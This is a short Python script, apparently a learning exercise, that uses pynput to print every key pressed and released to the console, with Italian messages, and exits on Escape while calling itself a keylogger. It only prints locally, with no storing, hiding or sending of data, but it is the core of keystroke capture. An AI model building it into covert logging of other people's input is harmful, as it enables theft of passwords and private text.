from pynput import keyboard

def on_press(key):
    print(f'il tasto premuto è: {key}')

def on_release(key):
    print(f'il tasto rilasciato è: {key}')
    if str(key) == "Key.esc":
        print('esco dal KEYLOGGER')
        return False

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()